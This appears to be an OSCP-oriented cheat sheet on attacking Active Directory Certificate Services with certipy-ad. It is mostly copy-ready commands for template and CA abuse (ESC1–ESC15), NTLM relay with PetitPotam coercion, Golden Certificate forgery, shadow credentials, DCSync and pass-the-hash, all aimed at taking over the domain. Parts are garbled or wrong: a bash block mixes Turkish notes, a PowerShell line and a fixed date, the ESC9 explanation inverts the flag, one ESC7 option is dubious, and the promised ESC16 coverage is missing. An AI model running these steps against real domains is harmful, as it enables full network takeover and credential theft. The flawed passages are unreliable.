# Active Directory Certificate Services (AD CS) Attacks — OSCP-Ready Methodology

Covers enumeration through ESC1–ESC16 exploitation, persistence, and cleanup. All commands use `certipy-ad` syntax (certipy ≥ 4.x). Replace `<placeholders>` with real values.

---

## 0. Prerequisites / Setup

```bash
pip3 install certipy-ad
certipy-ad --version
```

You need **one** of: domain creds (user/pass, hash, or Kerberos ticket), or an unauthenticated foothold if the environment allows null/guest binds (rare).

Sync time with the DC before anything Kerberos-related:

```bash
sudo ntpdate <dc-ip>
# or
sudo rdate -n <dc-ip>

# Şunu yap olmazsa
(Get-Date).ToUniversalTime()

# On Kali
sudo date -u -s "2026-10-08 00:15:31"

# sonra ligolo
```

---

## 1. Enumeration — Find the Certificate Authorities and Templates

**This is step zero of every AD CS engagement.** Everything downstream depends on this output.

```bash
# Full enumeration via RPC/LDAP — dumps CAs, templates, and flags them by vulnerability
certipy-ad find -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -vulnerable -stdout

# Same, but save full output + text summary to disk (do this by default — you'll reference it repeatedly)
certipy-ad find -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -vulnerable -enabled -output ad_cs_enum
```

**Decision point:** `certipy-ad find -vulnerable` auto-flags templates as `ESC1`, `ESC2`, `ESC3`, `ESC4`, `ESC9`, `ESC13`, etc. in the `[!] Vulnerabilities` section of the output. Read that section first — it tells you exactly which attack path to run next.

```bash
# Enumerate over LDAPS if LDAP is blocked/signed
certipy-ad find -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -scheme ldaps -vulnerable -stdout

# Enumerate using a Kerberos ticket (no password needed) — set KRB5CCNAME first
export KRB5CCNAME=<ticket>.ccache
certipy-ad find -u '<user>@<domain>' -k -no-pass -dc-ip <dc-ip> -vulnerable -stdout

# Enumerate using NTLM hash
certipy-ad find -u '<user>@<domain>' -hashes <LMHASH:NTHASH> -dc-ip <dc-ip> -vulnerable -stdout

# Old-school manual check — list every CA in the forest
certipy-ad find -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -stdout -text
```

Also worth checking with other tools for cross-validation:

```bash
netexec ldap <dc-ip> -u '<user>' -p '<password>' -M adcs
```

**Decision point:** if the enum output shows `Enrollee Supplies Subject: True` + `Client Authentication: True` + low-privileged enrollment rights → **ESC1**. If it shows a dangerous `pKIExtendedKeyUsage` / no EKU + enrollable → **ESC2**. If `Certificate Request Agent` EKU → **ESC3**. If weak ACL (`WriteOwner`/`WriteDacl`/`GenericWrite` on the template) → **ESC4**. If CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag → **ESC6**. If you (or a controllable principal) have `ManageCA`/`ManageCertificates` rights on the CA → **ESC7**. If HTTP enrollment endpoint is up → **ESC8**. Work through the matching section below.

---

## 2. ESC1 — Misconfigured Certificate Templates (SAN injection)

**Highest-yield AD CS vector — try this first.** Template allows the requester to supply an arbitrary Subject Alternative Name, has Client Authentication EKU, and low-priv users can enroll.

```bash
# Request a cert impersonating a privileged user (e.g. Domain Admin) via SAN
certipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<CA-NAME>' -template '<VULN-TEMPLATE>' -upn 'administrator@<domain>'

# Authenticate with the resulting cert to get a TGT + NT hash
certipy-ad auth -pfx administrator.pfx -dc-ip <dc-ip>
```

**Decision point:** `certipy-ad auth` prints the impersonated user's NT hash — pass it straight into `wmiexec`/`psexec`/`evil-winrm` (pass-the-hash) or use the issued TGT with `export KRB5CCNAME=administrator.ccache`.

```bash
# Use the recovered hash
netexec smb <dc-ip> -u administrator -H <NT-HASH>
evil-winrm -i <dc-ip> -u administrator -H <NT-HASH>
```

---

## 3. ESC2 — Any Purpose EKU / No EKU Templates

Template has no EKU restriction (or "Any Purpose"), so a cert issued from it can be used for client auth same as ESC1, **or** combined with ESC3-style agent abuse.

```bash
certipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<CA-NAME>' -template '<VULN-TEMPLATE>' -upn 'administrator@<domain>'
certipy-ad auth -pfx administrator.pfx -dc-ip <dc-ip>
```

If client-auth abuse fails (EKU doesn't support it), chain into ESC3 using the cert as an enrollment agent cert instead.

---

## 4. ESC3 — Enrollment Agent Templates

Template has the **Certificate Request Agent** EKU, letting the holder request certs _on behalf of other users_ (like an "enrollment agent").

```bash
# Step 1: get an enrollment agent certificate
certipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<CA-NAME>' -template '<AGENT-TEMPLATE>'

# Step 2: use the agent cert to request a cert ON BEHALF OF a target (e.g. Domain Admin)
certipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<CA-NAME>' -template '<TARGET-TEMPLATE>' -on-behalf-of '<domain>\administrator' -pfx agent.pfx

# Step 3: authenticate as the impersonated target
certipy-ad auth -pfx administrator.pfx -dc-ip <dc-ip>
```

---

## 5. ESC4 — Vulnerable Template ACLs (WriteOwner / WriteDacl / GenericWrite)

You (or a group you're in) have write access to a certificate template's AD object — rewrite it to be ESC1-exploitable, then exploit it.

```bash
# Overwrite the template's configuration to inject a vulnerable ESC1-style config
certipy-ad template -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -template '<TARGET-TEMPLATE>' -save-old

# certipy-ad automatically backs up original config with -save-old; it reconfigures the
# template (ENROLLEE_SUPPLIES_SUBJECT + client auth EKU) so it's now ESC1-exploitable

# Now exploit it exactly like ESC1
certipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<CA-NAME>' -template '<TARGET-TEMPLATE>' -upn 'administrator@<domain>'
certipy-ad auth -pfx administrator.pfx -dc-ip <dc-ip>

# Restore the original template config after (good practice / avoid detection & breakage)
certipy-ad template -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -template '<TARGET-TEMPLATE>' -configuration <backup-file>.json
```

---

## 6. ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA

CA-wide flag lets **any** enrollable template accept an attacker-supplied SAN, functionally turning every template into ESC1.

```bash
# Confirm the flag (shown in certipy-ad find output under CA "User Specified SAN: Enabled")
certipy-ad find -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -vulnerable -stdout

# Exploit identically to ESC1, against ANY enabled template that allows client auth
certipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<CA-NAME>' -template '<ANY-TEMPLATE>' -upn 'administrator@<domain>'
certipy-ad auth -pfx administrator.pfx -dc-ip <dc-ip>
```

**Note (exam-safety):** this flag often requires a CA service restart to take effect if you _set_ it yourself (ESC7 chain) — on a live exam box, prefer exploiting an _already-vulnerable_ flag rather than toggling it and restarting services.

---

## 7. ESC7 — Vulnerable CA Access Control (ManageCA / ManageCertificates)

You hold `ManageCA` and/or `ManageCertificates` rights on the CA itself.

```bash
# Confirm your rights
certipy-ad find -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -vulnerable -stdout

# Path A: ManageCA + ManageCertificates -> approve a previously "pending" malicious request
# 1. Request a cert on a template requiring manager approval (will be set to "pending")
certipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<CA-NAME>' -template '<TEMPLATE>' -upn 'administrator@<domain>'
# certipy-ad prints a request ID, e.g. "Request ID: 785"

# 2. Approve your own pending request using ManageCA/ManageCertificates rights
certipy-ad ca -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<CA-NAME>' -issue-request 785

# 3. Retrieve the now-issued certificate
certipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<CA-NAME>' -retrieve 785

certipy-ad auth -pfx administrator.pfx -dc-ip <dc-ip>
```

```bash
# Path B: ManageCA only -> enable the EDITF_ATTRIBUTESUBJECTALTNAME2 flag yourself, then do ESC6
certipy-ad ca -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<CA-NAME>' -enable-template 'SubCA'
certipy-ad ca -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<CA-NAME>' -attribute-san  # toggles EDITF_ATTRIBUTESUBJECTALTNAME2 via certipy-ad's flag helper

# NOTE: requires the CertSvc service to restart to take effect — only do this with explicit
# permission / understanding of exam rules on service restarts.
```

---

## 8. ESC8 — NTLM Relay to AD CS HTTP Enrollment Endpoint

Web Enrollment (`certsrv`) is enabled over HTTP and vulnerable to NTLM relay — relay a machine or user's auth to request a cert as them.

```bash
# 1. Confirm HTTP enrollment is live
certipy-ad find -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -vulnerable -stdout
# Look for "Web Enrollment: Enabled" in the CA section

# 2. Start certipy-ad's relay server targeting the CA's enrollment endpoint
certipy-ad relay -ca <ca-server-ip> -template DomainController

# 3. Coerce authentication from a target (DC machine account is the classic target) via PetitPotam / coercer / printerbug
python3 PetitPotam.py -u '<user>' -p '<password>' -d '<domain>' <attacker-ip> <target-dc-ip>
# or
coercer coerce -u '<user>' -p '<password>' -d '<domain>' -t <target-dc-ip> -l <attacker-ip>

# 4. certipy-ad relay captures the auth and issues a cert for the DC machine account -> dumps a .pfx

# 5. Authenticate as the DC machine account; use it for a full DCSync via shadow credentials or S4U2Self
certipy-ad auth -pfx dc01.pfx -dc-ip <dc-ip>
```

**Decision point:** if the coerced account is a Domain Controller's machine account, chain into a Golden-Ticket-adjacent DCSync (`secretsdump.py -just-dc` with the DC's hash) for full domain compromise.

---

## 9. ESC9 — No Security Extension (szOID_NTDS_CA_SECURITY_EXT missing)

Certificate issued lacks the `CT_FLAG_NO_SECURITY_EXTENSION` safeguard, letting a cert's `UPN`-based identity be abused via a **shadow credentials** style chain when combined with a `GenericWrite` on a target account.

```bash
# Prereq: you need GenericWrite/GenericAll on a target user to change their UPN temporarily
certipy-ad account update -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -user '<target-victim>' -upn 'administrator'

# Request a cert as the victim (whose UPN is now "administrator") using any ESC9-flagged template
certipy-ad req -u '<target-victim>@<domain>' -p '<victim-password-or-via-shadow-creds>' -dc-ip <dc-ip> -ca '<CA-NAME>' -template '<ESC9-TEMPLATE>'

# Restore the victim's original UPN (cleanup / avoid breaking things)
certipy-ad account update -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -user '<target-victim>' -upn '<target-victim>@<domain>'

# Authenticate with the resulting cert -- maps to "administrator" due to missing security extension
certipy-ad auth -pfx administrator.pfx -dc-ip <dc-ip> -domain <domain>
```

---

## 10. ESC10 — Weak Certificate Mapping on the DC (Schannel/UPN)

DC's `CertificateMappingMethods` registry setting is weak, allowing UPN-based cert authentication to impersonate another user even without ESC9 template flags. Exploited identically to ESC9's UPN-rewrite technique (steps above), but the vulnerability lives in the DC's cert-mapping config rather than the template.

---

## 11. ESC11 — Relay to ICPR (RPC) Encryption-Disabled Endpoint

Same idea as ESC8 but over RPC (`ICertPassage`) instead of HTTP, when `IF_ENFORCEENCRYPTICERTREQUEST` is disabled on the CA.

```bash
certipy-ad relay -ca <ca-server-ip> -template DomainController -icpr
python3 PetitPotam.py -u '<user>' -p '<password>' -d '<domain>' <attacker-ip> <target-dc-ip>
```

---

## 12. ESC13 — Issuance Policy Linked to Privileged Group

A certificate template's **Issuance Policy OID** is linked (via `msDS-OIDToGroupLink`) to a privileged AD group — enrolling grants effective group membership through the cert.

```bash
# certipy-ad find flags this automatically; confirm the linked group in the output
certipy-ad find -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -vulnerable -stdout

# Enroll in the template -- the resulting cert/TGT carries the linked group's privileges
certipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<CA-NAME>' -template '<ESC13-TEMPLATE>'
certipy-ad auth -pfx <user>.pfx -dc-ip <dc-ip>
```

---

## 13. ESC15 (EKUwu) — Schema v1 Template SAN/EKU Injection via Application Policy

On CAs with Schema version 1 templates, an attacker can inject an arbitrary **Application Policy** (instead of EKU) + SAN at request time even though the template wasn't designed to allow it.

```bash
certipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<CA-NAME>' -template '<SCHEMA-V1-TEMPLATE>' -upn 'administrator@<domain>' -application-policies 'Client Authentication'
certipy-ad auth -pfx administrator.pfx -dc-ip <dc-ip>
```

---

## 14. Golden Certificate — Persistence via Stolen CA Private Key

**Post-exploitation / persistence, not initial access.** Once you have Domain Admin or local admin on the CA server itself, extract the CA's private key to forge certificates for ANY user, forever (survives password changes).

```bash
# Dump the CA cert + private key from the CA server (requires local admin/DA on CA box)
certipy-ad ca -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<CA-NAME>' -backup

# Forge a certificate for ANY principal using the stolen CA key -- the "Golden Certificate"
certipy-ad forge -ca-pfx <ca-name>.pfx -upn 'administrator@<domain>' -subject 'CN=Administrator,CN=Users,DC=<domain-part1>,DC=<domain-part2>'

certipy-ad auth -pfx administrator_forged.pfx -dc-ip <dc-ip>
```

---

## 15. Shadow Credentials (not AD CS per se, but commonly chained here)

Abuse `msDS-KeyCredentialLink` write access to add an attacker-controlled key to a target account, then request a TGT via PKINIT using that key — functions like a certificate attack without needing the CA at all.

```bash
certipy-ad shadow auto -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -account '<target-victim>'
# This adds a key, requests a TGT via PKINIT, and dumps the NT hash in one shot
```

---

## 16. Post-Exploitation — Use What You Got

|You obtained|Next move|
|---|---|
|`.pfx` for a privileged user|`certipy-ad auth -pfx <file>.pfx -dc-ip <dc-ip>` → NT hash + TGT|
|NT hash of Domain Admin|`secretsdump.py <domain>/administrator@<dc-ip> -hashes :<hash>` for full DCSync|
|CA server local admin|Dump CA private key (section 14) for permanent Golden Certificate persistence|
|TGT (.ccache)|`export KRB5CCNAME=<file>.ccache` then `wmiexec.py -k -no-pass <domain>/administrator@<dc-fqdn>`|

---

## Priority Checklist — Fastest Paths to Try First

1. **Always run `certipy-ad find -vulnerable` first** — it tells you exactly which ESC path(s) exist; don't guess.
2. **ESC1** — most common misconfiguration in OSCP-style labs; check this before anything else.
3. **ESC4** — second most common; if you have write access to any template, you can manufacture ESC1 yourself.
4. **ESC7** — check `ManageCA`/`ManageCertificates` rights whenever you've compromised an account with unusual delegated rights.
5. **ESC8** — check Web Enrollment exposure whenever NTLM relay is viable and `PetitPotam`/coercion works against the DC.
6. **ESC3** — look for enrollment agent templates when ESC1/ESC2 come up empty.
7. **ESC13** — check issuance-policy-to-group links if the above are all patched; often overlooked.
8. **Golden Certificate / Shadow Credentials** — persistence only, use after domain compromise, not as initial access.

---

**Report-writing reminder:** for every step above, note _which `certipy-ad find` finding_ (template name, CA name, flagged vulnerability) justified running that exploit — OSCP reports are graded on the enumeration-to-exploitation reasoning chain, not just on popping Administrator.